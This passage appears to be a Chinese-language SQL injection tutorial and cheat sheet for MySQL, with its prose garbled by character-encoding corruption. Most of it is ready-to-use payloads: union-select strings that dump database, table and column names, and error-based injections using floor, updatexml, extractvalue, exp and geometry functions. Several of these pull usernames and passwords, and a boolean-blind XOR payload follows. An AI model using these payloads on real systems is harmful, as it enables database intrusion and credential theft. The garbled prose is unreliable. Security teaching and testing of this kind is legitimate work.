userid={userid|int}\";\n\n$sb->PreSql($SqlTemplate,$_GET['userid']);\n```\næ¨¡æ¿é‡Œæœ‰å…³æ•°æ®åŠæ•°æ®è‡ªèº«æ„ä¹‰çš„æè¿°ï¼ŒPreSqlæ–¹æ³•å°†å®ç°å°†æ¨¡æ¿å’Œæ•°æ®å®‰å…¨çš„è½¬æ¢ä¸ºSQLè¯­å¥çš„åŠŸèƒ½ï¼Œä»¥ä¿éšœæœ€ç»ˆçš„å®‰å…¨çš„å®ç°\n\n\n# å§¿åŠ¿æ€»ç»“\n\n## æ³¨é‡Š\næˆ‘ä»¬ç¯¡æ”¹SQLè¯­å¥å¾ˆå¤šæ—¶å€™éƒ½ä¼šä½¿ç”¨åˆ°æ³¨é‡Šï¼ŒSQLè¯­æ³•ä¸­çš„æ³¨é‡Šç¬¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š\n```\n#\n--+(è¿™é‡Œçš„+å…¶å®æ˜¯ç©ºæ ¼çš„æ„æ€ï¼Œå› ä¸ºæˆ‘ä»¬çš„æ³¨å…¥æ—¶+é€šå¸¸ä¼šè¢«è¯†åˆ«ä¸ºç©ºæ ¼ï¼Œè¿™æ˜¯æ—©æœŸå…»æˆçš„ä¹ æƒ¯ï¼Œä½†æ˜¯åæ¥åœ¨çœ‹ä¸€äº›å¤§ç‰›çš„æ–‡ç« çš„æ—¶å€™ä¼šå‘ç°ä»–ä»¬æ›´çˆ±ç”¨-- -è¿™ç§å½¢å¼ï¼Œå¾ˆå¤šå·¥å…·ç­‰ç­‰ä¹Ÿæ˜¯)\n/**/(è¿™ä¸ªä¹Ÿä¸å¤ªå¸¸ç”¨)\n```\n\n## åŒ…å«ä¿¡æ¯çš„å†…ç½®è¡¨\n```\ninformation_schema.tables\ninformation_schema.columns\n```\n\n# mysqlæ³¨å…¥\n\n## mysqlæ•°æ®åº“\nMySQLæ˜¯ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œç”±ç‘å…¸ MySQL AB å…¬å¸å¼€å‘ï¼Œç›®å‰å±äº Oracle å…¬å¸ã€‚MySQL æ˜¯ä¸€ç§ `å…³è”æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ` ï¼Œå…³è”æ•°æ®åº“å°†æ•°æ®ä¿å­˜åœ¨ä¸åŒçš„è¡¨ä¸­ï¼Œè€Œä¸æ˜¯å°†æ‰€æœ‰æ•°æ®æ”¾åœ¨ä¸€ä¸ªå¤§ä»“åº“å†…ï¼Œè¿™æ ·å°±å¢åŠ äº†é€Ÿåº¦å¹¶æé«˜äº†çµæ´»æ€§ã€‚\n\n- MySQLæ˜¯å¼€æºçš„ï¼Œæ‰€ä»¥ä½ ä¸éœ€è¦æ”¯ä»˜é¢å¤–çš„è´¹ç”¨ã€‚\n- MySQLä½¿ç”¨æ ‡å‡†çš„ SQL æ•°æ®è¯­è¨€å½¢å¼ã€‚\n- MySQLå¯ä»¥è¿è¡Œäºå¤šä¸ªç³»ç»Ÿä¸Šï¼Œå¹¶ä¸” æ”¯æŒå¤šç§è¯­è¨€ ã€‚è¿™äº›ç¼–ç¨‹è¯­è¨€åŒ…æ‹¬ Cã€C++ã€Pythonã€Javaã€Perlã€PHPã€Eiffelã€Ruby å’Œ Tcl ç­‰ã€‚\n- MySQL å¯¹PHPæœ‰å¾ˆå¥½çš„æ”¯æŒ ï¼ŒPHP æ˜¯ç›®å‰æœ€æµè¡Œçš„ Web å¼€å‘è¯­è¨€ã€‚\n- MySQL æ”¯æŒå¤§å‹æ•°æ®åº“ ï¼Œæ”¯æŒ 5000 ä¸‡æ¡è®°å½•çš„æ•°æ®ä»“åº“ï¼Œ32 ä½ç³»ç»Ÿè¡¨æ–‡ä»¶æœ€å¤§å¯æ”¯æŒ 4GBï¼Œ64 ä½ç³»ç»Ÿæ”¯æŒæœ€å¤§çš„è¡¨æ–‡ä»¶ä¸º8TBã€‚\n- MySQLæ˜¯ å¯ä»¥å®šåˆ¶çš„ ï¼Œé‡‡ç”¨äº† GPL åè®®ï¼Œä½ å¯ä»¥ä¿®æ”¹æºç æ¥å¼€å‘è‡ªå·±çš„ MySQL ç³»ç»Ÿã€‚\n\nä¸€ä¸ªå®Œæ•´çš„mysqlç®¡ç†ç³»ç»Ÿç»“æ„é€šå¸¸å¦‚ä¸‹å›¾ï¼š\n![](https://raw.githubusercontent.com/chencicici/images/main/202206241358298.png)\n\nå¯ä»¥çœ‹åˆ°ï¼Œmysqlå¯ä»¥ç®¡ç† `å¤šä¸ªæ•°æ®åº“` ï¼Œä¸€ä¸ªæ•°æ®åº“å¯ä»¥åŒ…å« `å¤šä¸ªæ•°æ®è¡¨`ï¼Œè€Œä¸€ä¸ªæ•°æ®è¡¨æœ‰å«æœ‰ `å¤šæ¡å­—æ®µ` ï¼Œä¸€è¡Œæ•°æ®æ­£æ˜¯å¤šä¸ªå­—æ®µåŒä¸€è¡Œçš„ä¸€ä¸²æ•°æ®ã€‚\n\nMysqlå…·æœ‰å¾ˆç‹¬ç‰¹çš„ç‰¹ç‚¹è€Œä¸”ä½¿ç”¨æœ€ä¸ºå¹¿æ³›ï¼ŒMysqlæ•°æ®åº“æœ¬èº«çš„æƒé™æé«˜ï¼Œä½œä¸ºåº”ç”¨å¯ä»¥å¯¹æœ¬æœºè¿›è¡Œæ–‡ä»¶è¯»å†™ï¼Œå¯ä»¥è¿›è¡Œææƒç­‰ã€‚\n\n\n## è”åˆæŸ¥è¯¢\nå¾ˆå¤šæ—¶å€™è”åˆæŸ¥è¯¢ä¹Ÿä¼šå’Œå…¶ä»–çš„å‡ ç§æŸ¥è¯¢æ–¹å¼ä¸€èµ·ä½¿ç”¨ã€‚\nè”åˆæŸ¥è¯¢ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†\n\n```\nUNIONå¯ä»¥å°†å‰åä¸¤ä¸ªæŸ¥è¯¢è¯­å¥çš„ç»“æœæ‹¼æ¥åˆ°ä¸€èµ·ï¼Œä½†æ˜¯ä¼šè‡ªåŠ¨å»é‡ã€‚\nUNION ALLåŠŸèƒ½ç›¸åŒï¼Œä½†æ˜¯ä¼šæ˜¾ç¤ºæ‰€æœ‰æ•°æ®ï¼Œä¸ä¼šå»é‡ã€‚\n```\nå…·æœ‰ç±»ä¼¼åŠŸèƒ½çš„è¿˜æœ‰JOIN https://blog.csdn.net/julielele/article/details/82023577 ä½†æ˜¯æ˜¯ä¸€ä¸ªå¯¹åº“è¡¨ç­‰è¿›è¡Œè¿æ¥çš„è¯­å¥ï¼Œæˆ‘ä»¬åœ¨åç»­çš„ç»•è¿‡ä¸­ä¼šæåˆ°åˆ©ç”¨å®ƒæ¥è¿›è¡Œæ— åˆ—åæ³¨å…¥ã€‚\n\n\n1. åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹ï¼Œé—­åˆæƒ…å†µï¼Œç»•è¿‡æ–¹å¼\n```bash\n?id=1' \n?id=1\" \n?id=1') \n?id=1\") \n?id=1' or 1#\n?id=1' or 0#\n?id=1' or 1=1#\n?id=1' and 1=2#\n?id=1' and sleep(5)#\n?id=1' and 1=2 or ' \n?id=1\\\n```\n\n2. çŒœæµ‹SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°\n- ä½¿ç”¨ order/group by è¯­å¥ï¼Œé€šè¿‡å¾€åè¾¹æ‹¼æ¥æ•°å­—æŒ‡å¯¼é¡µé¢æŠ¥é”™ï¼Œå¯ç¡®å®šå­—æ®µæ•°é‡ã€‚\n```bash\n1' order by 1#\n1' order by 2#\n1' order by 3#\n1 order by 1\n1 order by 2\n1 order by 3\n```   \n\n- ä½¿ç”¨ union select è”åˆæŸ¥è¯¢ï¼Œä¸æ–­åœ¨ union select åé¢åŠ æ•°å­—ï¼Œç›´åˆ°ä¸æŠ¥é”™ï¼Œå³å¯ç¡®å®šå­—æ®µæ•°é‡ã€‚\n```bash\n1' union select 1#\n1' union select 1,2#\n1' union select 1,2,3#\n1 union select 1#\n1 union select 1,2#\n1 union select 1,2,3#\n```\n\n3. ç¡®å®šæ˜¾ç¤ºæ•°æ®çš„å­—æ®µä½ç½®\nä½¿ç”¨ union select 1,2,3,4,... æ ¹æ®å›æ˜¾çš„å­—æ®µæ•°ï¼Œåˆ¤æ–­å›æ˜¾æ•°æ®çš„å­—æ®µä½ç½®ã€‚\n```bash\n-1' union select 1#\n-1' union select 1,2#\n-1' union select 1,2,3#\n-1 union select 1#\n-1 union select 1,2#\n-1 union select 1,2,3#\n```\n\næ³¨æ„ï¼š\n- è‹¥ç¡®å®šé¡µé¢æœ‰å›æ˜¾ï¼Œä½†æ˜¯é¡µé¢ä¸­å¹¶æ²¡æœ‰æˆ‘ä»¬å®šä¹‰çš„ç‰¹æ®Šæ ‡è®°æ•°å­—å‡ºç°ï¼Œå¯èƒ½æ˜¯é¡µé¢è¿›è¡Œçš„æ˜¯å•è¡Œæ•°æ®è¾“å‡ºï¼Œæˆ‘ä»¬è®©å‰è¾¹çš„ select æŸ¥è¯¢æ¡ä»¶è¿”å›ç»“æœä¸ºç©ºå³å¯ã€‚\n- â¼€å®šè¦æ‹¼æ¥å¤Ÿè¶³å¤Ÿçš„å­—æ®µæ•°ï¼Œå¦åˆ™SQLè¯­å¥æŠ¥é”™ã€‚\n\n\n4. åœ¨å›æ˜¾æ•°æ®çš„å­—æ®µä½ç½®ä½¿ç”¨ union select å°†æˆ‘ä»¬æ‰€éœ€è¦çš„æ•°æ®æŸ¥è¯¢å‡ºæ¥å³å¯ã€‚åŒ…æ‹¬ä½†ä¸é™äºï¼š\n- è·å–å½“å‰æ•°æ®åº“å\n```bash\n-1' union select 1,2,database()--+\n```\n- è·å–å½“å‰æ•°æ®åº“çš„è¡¨å\n```bash\n-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+\n\n-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+\n```\n- è·å–è¡¨ä¸­çš„å­—æ®µå\n```bash\n-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+\n\n-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3--+\n```\n\n-  è·å–æ•°æ®\n```bash\n-1' union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+\n\n-1' union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3--+\n```\nä¸€èˆ¬æƒ…å†µä¸‹å°±æ˜¯è¿™æ ·çš„ä¸€ä¸ªé¡ºåºï¼Œ`ç¡®å®šè”åˆæŸ¥è¯¢çš„å­—æ®µæ•°->ç¡®å®šè”åˆæŸ¥è¯¢å›æ˜¾ä½ç½®->çˆ†åº“->çˆ†è¡¨->çˆ†å­—æ®µ->çˆ†æ•°æ®ã€‚`\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œä½¿ç”¨äº†group_concatæ¥æ‹¼æ¥æŸ¥è¯¢å¤šä¸ªæ•°æ®ï¼Œåœ¨å¾ˆå¤šç§æŸ¥è¯¢ä¸­éƒ½æœ‰ä½¿ç”¨è¿™ä¸ªå‡½æ•°æ¥æé«˜æ•ˆç‡ï¼ŒåŒæ—¶è¿˜å¯ä»¥æ‹¼æ¥åå…­è¿›åˆ¶ç‰¹æ®Šå­—ç¬¦æ¥åˆ†éš”ï¼ŒåŒæ—¶è¿˜ä½¿ç”¨äº†information_shcemaè¡¨è·å–è¡¨ä¿¡æ¯ã€å­—æ®µä¿¡æ¯ï¼Œè¿™ä¸ªè¡¨åœ¨ä½ç‰ˆæœ¬mysqlä¸­ä¸å­˜åœ¨ï¼ŒåŒæ—¶æœ‰æ—¶è¿˜ä¼šè¢«è¿‡æ»¤ï¼Œè¿™ä¹Ÿä¼šæ˜¯æˆ‘ä»¬ç»•è¿‡çš„ä¸€ä¸ªæ–¹å‘ã€‚\n\n## æŠ¥é”™æ³¨å…¥\nå¤§ä½“çš„æ€è·¯å°±æ˜¯åˆ©ç”¨æŠ¥é”™å›æ˜¾ï¼ŒåŒæ—¶æˆ‘ä»¬çš„æŸ¥è¯¢æŒ‡ä»¤æˆ–è€…SQLå‡½æ•°ä¼šè¢«æ‰§è¡Œï¼Œ`æŠ¥é”™çš„è¿‡ç¨‹å¯èƒ½ä¼šå‡ºç°åœ¨æŸ¥è¯¢æˆ–è€…æ’å…¥ç”šè‡³åˆ é™¤çš„è¿‡ç¨‹ä¸­ã€‚`\n\n### floor()\nfloor()ï¼ˆ8.x>mysql>5.0ï¼‰`åŒæŸ¥è¯¢æŠ¥é”™æ³¨å…¥`\nå‡½æ•°è¿”å›å°äºæˆ–ç­‰äºæŒ‡å®šå€¼ï¼ˆvalueï¼‰çš„æœ€å°æ•´æ•°,å–æ•´\n\n\né€šè¿‡flooræŠ¥é”™çš„æ–¹æ³•æ¥çˆ†æ•°æ®çš„æœ¬è´¨æ˜¯group byè¯­å¥çš„æŠ¥é”™ã€‚group byè¯­å¥æŠ¥é”™çš„åŸå› æ˜¯floor(random(0)*2)çš„ä¸ç¡®å®šæ€§ï¼Œå³å¯èƒ½ä¸º0ä¹Ÿå¯èƒ½ä¸º1\ngroup by keyçš„åŸç†æ˜¯å¾ªç¯è¯»å–æ•°æ®çš„æ¯ä¸€è¡Œï¼Œå°†ç»“æœä¿å­˜äºä¸´æ—¶è¡¨ä¸­ã€‚è¯»å–æ¯ä¸€è¡Œçš„keyæ—¶ï¼Œå¦‚æœkeyå­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™ä¸åœ¨ä¸´æ—¶è¡¨ä¸­æ›´æ–°ä¸´æ—¶è¡¨ä¸­çš„æ•°æ®ï¼›å¦‚æœè¯¥keyä¸å­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™åœ¨ä¸´æ—¶è¡¨ä¸­æ’å…¥keyæ‰€åœ¨è¡Œçš„æ•°æ®ã€‚\ngroup by floor(random(0)*2)å‡ºé”™çš„åŸå› æ˜¯keyæ˜¯ä¸ªéšæœºæ•°ï¼Œæ£€æµ‹ä¸´æ—¶è¡¨ä¸­keyæ˜¯å¦å­˜åœ¨æ—¶è®¡ç®—äº†ä¸€ä¸‹floor(random(0)*2)å¯èƒ½ä¸º0ï¼Œå¦‚æœæ­¤æ—¶ä¸´æ—¶è¡¨åªæœ‰keyä¸º1çš„è¡Œä¸å­˜åœ¨keyä¸º0çš„è¡Œï¼Œé‚£ä¹ˆæ•°æ®åº“è¦å°†è¯¥æ¡è®°å½•æ’å…¥ä¸´æ—¶è¡¨ï¼Œç”±äºæ˜¯éšæœºæ•°ï¼Œæ’æ—¶åˆè¦è®¡ç®—ä¸€ä¸‹éšæœºå€¼ï¼Œæ­¤æ—¶floor(random(0)*2)ç»“æœå¯èƒ½ä¸º1ï¼Œå°±ä¼šå¯¼è‡´æ’å…¥æ—¶å†²çªè€ŒæŠ¥é”™ã€‚å³æ£€æµ‹æ—¶å’Œæ’å…¥æ—¶ä¸¤æ¬¡è®¡ç®—äº†éšæœºæ•°çš„å€¼ã€‚\n\n```bash\n?id=0â€™ union select 1,2,3 from(select count(*),concat((select concat(version(),â€™-â€™,database(),â€™-â€™,user()) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+\n/*æ‹†è§£å‡ºæ¥å°±æ˜¯ä¸‹é¢çš„è¯­å¥*/\nconcat((select concat(version(),â€™-â€™,database(),â€™-â€™,user()) limit 0,1),floor(rand(0)*2))x\n```\n\nå¯ä»¥çœ‹åˆ°è¿™é‡Œå®é™…ä¸Šä¸å…‰ä½¿ç”¨äº†æŠ¥é”™æ³¨å…¥è¿˜æ˜¯ç”¨äº†åˆšåˆšçš„è”åˆæŸ¥è¯¢ï¼ŒåŒæ—¶è¿˜æ˜¯ä¸€ä¸ªåŒæŸ¥è¯¢çš„æŠ¥é”™æ³¨å…¥ï¼Œå½“åœ¨ä¸€ä¸ªèšåˆå‡½æ•°ï¼Œæ¯”å¦‚count()å‡½æ•°åé¢å¦‚æœä½¿ç”¨group byåˆ†ç»„è¯­å¥çš„è¯ï¼Œå°±å¯èƒ½ä¼šæŠŠæŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ä»¥é”™è¯¯çš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥ã€‚ä½†æ˜¯è¦å¤šæ¬¡æµ‹è¯•æ‰å¯ä»¥å¾—åˆ°æŠ¥é”™\n\nåŒæŸ¥è¯¢æŠ¥é”™æ³¨å…¥çš„åŸç† https://blog.csdn.net/lixiangminghate/article/details/80466257ï¼Œhttps://www.freebuf.com/articles/web/250376.html\n\nå¤§ä½“æ€è·¯å°±æ˜¯å½“åœ¨ä¸€ä¸ªèšåˆå‡½æ•°ï¼Œæ¯”å¦‚countå‡½æ•°åé¢å¦‚æœä½¿ç”¨åˆ†ç»„è¯­å¥å°±ä¼šæŠŠæŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ä»¥é”™è¯¯çš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥ï¼Œä½†æ˜¯å› ä¸ºéšæœºæ•°è¦æµ‹è¯•å¤šæ¬¡æ‰èƒ½å¾—åˆ°æŠ¥é”™ï¼Œä¸Šé¢æŠ¥é”™æ³¨å…¥å‡½æ•°ä¸­çš„ç¬¬ä¸€ä¸ªFloor()å°±æ˜¯è¿™ç§æƒ…å†µã€‚\n\n### extractvalue()\nå¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°\n\nç¬¬äºŒä¸ªå‚æ•° xmlä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ /xxx/xxx/xxx/â€¦è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ã€‚\n```bash\nand (extractvalue(â€˜anythingâ€™,concat(â€˜#â€™,substring(hex((select database())),1,5))))\n```\n\n### UPDATEXML (XML_document, XPath_string, new_value);\nç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§° æ–‡ä¸­ä¸ºDoc\nç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚\nç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®\nä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼\n\nç”±äºupdatexmlçš„ç¬¬äºŒä¸ªå‚æ•°éœ€è¦Xpathæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸ç¬¦åˆxmlæ ¼å¼çš„è¯­æ³•ï¼Œå°±å¯ä»¥å®ç°æŠ¥é”™æ³¨å…¥äº†ã€‚\n\nè¿™ä¹Ÿæ˜¯ä¸€ç§éå¸¸å¸¸è§çš„æŠ¥é”™æ³¨å…¥çš„å‡½æ•°ã€‚\n```bash\n' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+\n```\n\n###  exp(x)\nè¿”å› e çš„ x æ¬¡æ–¹,å½“ æ•°æ®è¿‡å¤§ æº¢å‡ºæ—¶æŠ¥é”™ï¼Œå³ x > 709\n```bash\nmail=') or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e))) as asd))--+\n```\n\n\n### geometrycollection() mysql ç‰ˆæœ¬5.5\nï¼ˆ1ï¼‰å‡½æ•°è§£é‡Šï¼š\nGeometryCollectionæ˜¯ç”±1ä¸ªæˆ–å¤šä¸ªä»»æ„ç±»å‡ ä½•å¯¹è±¡æ„æˆçš„å‡ ä½•å¯¹è±¡ã€‚GeometryCollectionä¸­çš„æ‰€æœ‰å…ƒç´ å¿…é¡»å…·æœ‰ç›¸åŒçš„ç©ºé—´å‚è€ƒç³»ï¼ˆå³ç›¸åŒçš„åæ ‡ç³»ï¼‰ã€‚\n\nï¼ˆ2ï¼‰å®˜æ–¹æ–‡æ¡£ä¸­ä¸¾ä¾‹çš„ç”¨æ³•å¦‚ä¸‹ï¼š\nGEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))\n\nï¼ˆ3ï¼‰æŠ¥é”™åŸå› ï¼š\nå› ä¸ºMYSQLæ— æ³•ä½¿ç”¨è¿™æ ·çš„å­—ç¬¦ä¸²ç”»å‡ºå›¾å½¢ï¼Œæ‰€ä»¥æŠ¥é”™\n```bash\n1') and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name='manage' limit 0,1)a)b)); %23\n1') and geometrycollection((select * from(select * from(select distinct concat(0x23,user,0x2a,password,0x23,name,0x23) FROM manage limit 0,1)a)b)); %23\n1') and geometrycollection((select * from(select * from(select version())a)b)); %23\n```\nè¿™é‡Œå’Œæˆ‘ä»¬ä¸Šé¢å­¦è¿‡çš„cancatå’Œä¸Šä¸€å…³å­¦çš„å†…ç½®è¡¨æœ‰ä¸¤ä¸ªæ¢¦å¹»è”åŠ¨\n\n### multipoint() mysql ç‰ˆæœ¬5.5\nï¼ˆ1ï¼‰å‡½æ•°è§£é‡Šï¼š\nMultiPointæ˜¯ä¸€ç§ç”±Pointå…ƒç´ æ„æˆçš„å‡ ä½•å¯¹è±¡é›†åˆã€‚è¿™äº›ç‚¹æœªä»¥ä»»ä½•æ–¹å¼è¿æ¥æˆ–æ’åºã€‚\nâ€‚\nï¼ˆ2ï¼‰æŠ¥é”™åŸå› ï¼š\nåŒæ ·æ˜¯å› ä¸ºæ— æ³•ä½¿ç”¨å­—ç¬¦ä¸²ç”»å‡ºå›¾å½¢ä¸geometrycollectionç±»ä¼¼\n```bash\n1') and multipoint((select * from(select * from(select version())a)b)); %23\n```\n\n### polygon()\npolygonæ¥è‡ªå¸Œè…Šã€‚ â€œPolyâ€ æ„å‘³ â€œmanyâ€ ï¼Œ â€œgonâ€ æ„å‘³ â€œangleâ€.\nPolygonæ˜¯ä»£è¡¨å¤šè¾¹å‡ ä½•å¯¹è±¡çš„å¹³é¢Surfaceã€‚å®ƒç”±å•ä¸ªå¤–éƒ¨è¾¹ç•Œä»¥åŠ0æˆ–å¤šä¸ªå†…éƒ¨è¾¹ç•Œå®šä¹‰ï¼Œå…¶ä¸­ï¼Œæ¯ä¸ªå†…éƒ¨è¾¹ç•Œå®šä¹‰ä¸ºPolygonä¸­çš„1ä¸ªå­”ã€‚\n```bash\n') or polygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,':',password) from manage))asd)asd))--+\n```\n\n###  mutipolygon()\n```bash\n') or multipolygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,':',password) from manage))asd)asd))\n```\n\n### linestring(ï¼‰\næŠ¥é”™åŸç†ï¼š\nmysqlçš„æœ‰äº›å‡ ä½•å‡½æ•°ï¼ˆ ä¾‹å¦‚geometrycollection()ï¼Œmultipoint()ï¼Œpolygon()ï¼Œmultipolygon()ï¼Œlinestring()ï¼Œmultilinestring() ï¼‰å¯¹å‚æ•°è¦æ±‚ä¸ºå‡ ä½•æ•°æ®ï¼Œè‹¥ä¸æ»¡è¶³è¦æ±‚åˆ™ä¼šæŠ¥é”™ï¼Œé€‚ç”¨äº5.1-5.5ç‰ˆæœ¬ (5.0.ä¸­å­˜åœ¨ä½†æ˜¯ä¸ä¼šæŠ¥é”™)\n```bash\n1') and linestring((select * from(select * from(select database())a)b))--+;\n```\n\n### multilinestring()\nåŒä¸Š\n\n### ST.LatFromGeoHash()ï¼ˆmysql>=5.7.xï¼‰\n```bash\n') or ST_LatFromGeoHash((select * from(select * from(select (select (concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e))))a)b))--+\n```\n\n### ST.LongFromGeoHash\nåŒä¸Š åµŒå¥—æŸ¥è¯¢\n\n### ST_Pointfromgeohash (mysql>5.7)\nè·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯\n```bash\n')or  ST_PointFromGeoHash(version(),1)--+\n')or  ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+\n')or  ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = 'manage' limit 0,1),1)--+\n')or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,':',`password`) from manage),0x23)),1)--+\n```\n\n## å¸ƒå°”ç›²æ³¨\nSQL Injectionï¼ˆBlindï¼‰ï¼Œå³SQLç›²æ³¨ï¼Œä¸ä¸€èˆ¬æ³¨å…¥çš„åŒºåˆ«åœ¨äºï¼Œä¸€èˆ¬çš„æ³¨å…¥æ”»å‡»è€…å¯ä»¥ç›´æ¥ä»é¡µé¢ä¸Šçœ‹åˆ°æ³¨å…¥è¯­å¥çš„æ‰§è¡Œç»“æœï¼Œè€Œç›²æ³¨æ—¶æ”»å‡»è€…é€šå¸¸æ˜¯æ— æ³•ä»æ˜¾ç¤ºé¡µé¢ä¸Šè·å–sqlè¯­å¥çš„æ‰§è¡Œç»“æœï¼Œç”šè‡³è¿æ³¨å…¥è¯­å¥æ˜¯å¦æ‰§è¡Œéƒ½æ— ä»å¾—çŸ¥ï¼Œå› æ­¤ç›²æ³¨çš„éš¾åº¦è¦æ¯”ä¸€èˆ¬æ³¨å…¥é«˜ã€‚ç›®å‰ç½‘ç»œä¸Šç°å­˜çš„SQLæ³¨å…¥æ¼æ´å¤§å¤šæ˜¯SQLç›²æ³¨ã€‚\n\nå¯¹äºåŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼Œå¯é€šè¿‡æ„é€ çœŸorå‡åˆ¤æ–­æ¡ä»¶ï¼ˆæ•°æ®åº“å„é¡¹ä¿¡æ¯å–å€¼çš„å¤§å°æ¯”è¾ƒï¼Œ å¦‚ï¼šå­—æ®µé•¿åº¦ã€ç‰ˆæœ¬æ•°å€¼ã€å­—æ®µåã€å­—æ®µåå„ç»„æˆéƒ¨åˆ†åœ¨ä¸åŒä½ç½®å¯¹åº”çš„å­—ç¬¦ASCIIç ...ï¼‰ï¼Œ å°†æ„é€ çš„sqlè¯­å¥æäº¤åˆ°æœåŠ¡å™¨ï¼Œç„¶åæ ¹æ®æœåŠ¡å™¨å¯¹ä¸åŒçš„è¯·æ±‚è¿”å›ä¸åŒçš„é¡µé¢ç»“æœ ï¼ˆTrueã€Falseï¼‰ï¼›ç„¶åä¸æ–­è°ƒæ•´åˆ¤æ–­æ¡ä»¶ä¸­çš„æ•°å€¼ä»¥é€¼è¿‘çœŸå®å€¼ï¼Œç‰¹åˆ«æ˜¯éœ€è¦å…³æ³¨å“åº”ä»True<-->Falseå‘ç”Ÿå˜åŒ–çš„è½¬æŠ˜ç‚¹ã€‚\n\n### ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†\nä¼šç”¨åˆ°æˆªå–å­—ç¬¦çš„å‡½æ•°ï¼šsubstr()\nå¯ä»¥ç›´æ¥åˆ¤æ–­å­—ç¬¦æˆ–è€…æ ¹æ®ASCIIç æ¥åˆ¤æ–­ï¼Œåˆ©ç”¨ASCIIç æ—¶è¦ç”¨åˆ°ASCII()å‡½æ•°æ¥å°†å­—ç¬¦è½¬æ¢ä¸ºASCIIç å€¼ã€‚\nè¿˜ç”¨åˆ°äº†å„ç§è¿ç®—ç¬¦ï¼Œ<ï¼Œ>ï¼Œ=å½“ç„¶ä¸å¿…å¤šæï¼Œä½†æ˜¯åœ¨ä¸‹é¢POSTçš„æ–¹å¼ä¸­ç”¨åˆ°äº†å¼‚æˆ–ç¬¦å·^ï¼Œè¿™é‡Œå…¶å®æ˜¯ä¸€ç§å¼‚æˆ–æ³¨å…¥çš„æ–¹æ³•ï¼Œå½“æˆ‘ä»¬åœ¨å°è¯•SQLæ³¨å…¥æ—¶,å‘ç°union,andè¢«å®Œå…¨è¿‡æ»¤æ‰äº†,å°±å¯ä»¥è€ƒè™‘ä½¿ç”¨å¼‚æˆ–æ³¨å…¥ã€‚\n```bash\nå¼‚æˆ–è¿ç®—è§„åˆ™:\n1^1=0 0^0=0 0^1=1\n1^1^1=0 1^1^0=0\næ„é€ payload:'^ascii(mid(database(),1,1)=98)^0\n```\næ³¨æ„è¿™é‡Œä¼šå¤šåŠ ä¸€ä¸ª^0æˆ–1æ˜¯å› ä¸ºåœ¨ç›²æ³¨çš„æ—¶å€™å¯èƒ½å‡ºç°äº†è¯­æ³•é”™è¯¯ä¹Ÿæ— æ³•åˆ¤æ–­,è€Œæ”¹å˜è¿™é‡Œçš„0æˆ–1,å¦‚æœè¿”å›çš„ç»“æœæ˜¯ä¸åŒçš„,é‚£å°±å¯ä»¥è¯æ˜è¯­æ³•æ˜¯æ²¡æœ‰é—®é¢˜çš„.\n\n### 